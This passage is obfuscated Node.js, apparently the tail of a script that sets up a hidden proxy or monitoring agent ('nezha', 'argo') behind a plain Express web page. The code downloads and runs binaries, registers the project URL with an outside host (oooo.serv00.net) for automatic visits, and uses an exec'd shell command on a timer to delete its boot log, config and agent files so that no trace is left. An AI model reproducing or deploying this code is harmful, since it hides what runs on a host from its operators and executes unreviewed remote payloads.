_0x74c9e3=_0x3076,_0x2eca41=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2eca41[_0x74c9e3(0xac)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2eca41['push'](phpPath);process[_0x74c9e3(0xc0)]===_0x74c9e3(0xa7)?exec(_0x74c9e3(0x14e)+_0x2eca41[_0x74c9e3(0xf7)]('\x20')+_0x74c9e3(0x115),_0x544bf4=>{const _0x47461d=_0x74c9e3;console[_0x47461d(0x14b)](),console[_0x47461d(0xcd)](_0x47461d(0xdd)),console[_0x47461d(0xcd)](_0x47461d(0x133));}):exec(_0x74c9e3(0x162)+_0x2eca41[_0x74c9e3(0xf7)]('\x20')+_0x74c9e3(0x110),_0x599c14=>{const _0x2cac88=_0x74c9e3;console[_0x2cac88(0x14b)](),console[_0x2cac88(0xcd)](_0x2cac88(0xdd)),console[_0x2cac88(0xcd)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x327fb1=_0x42415c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x327fb1(0xcd)](_0x327fb1(0xae));return;}try{const _0x2103c0=await axios[_0x327fb1(0x122)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x327fb1(0x132)}});return console[_0x327fb1(0xcd)](_0x327fb1(0x116)),_0x2103c0;}catch(_0x26f491){return console[_0x327fb1(0x13b)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x26f491[_0x327fb1(0x12a)]),null;}}async function startserver(){const _0x4be6df=_0x42415c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x11a5fe){console[_0x4be6df(0x13b)](_0x4be6df(0x15f),_0x11a5fe);}}startserver()['catch'](_0xca3248=>{const _0x506108=_0x42415c;console[_0x506108(0x13b)](_0x506108(0xfa),_0xca3248);}),app[_0x42415c(0xe9)]('/',async function(_0x6d467b,_0x4b0bb7){const _0x46194f=_0x42415c;_0x4b0bb7[_0x46194f(0x147)](0xc8)[_0x46194f(0x117)](_0x46194f(0xf4));}),app[_0x42415c(0x9a)](PORT,_0x42415c(0x11b),()=>console['log'](_0x42415c(0xe5)+PORT+'!'));
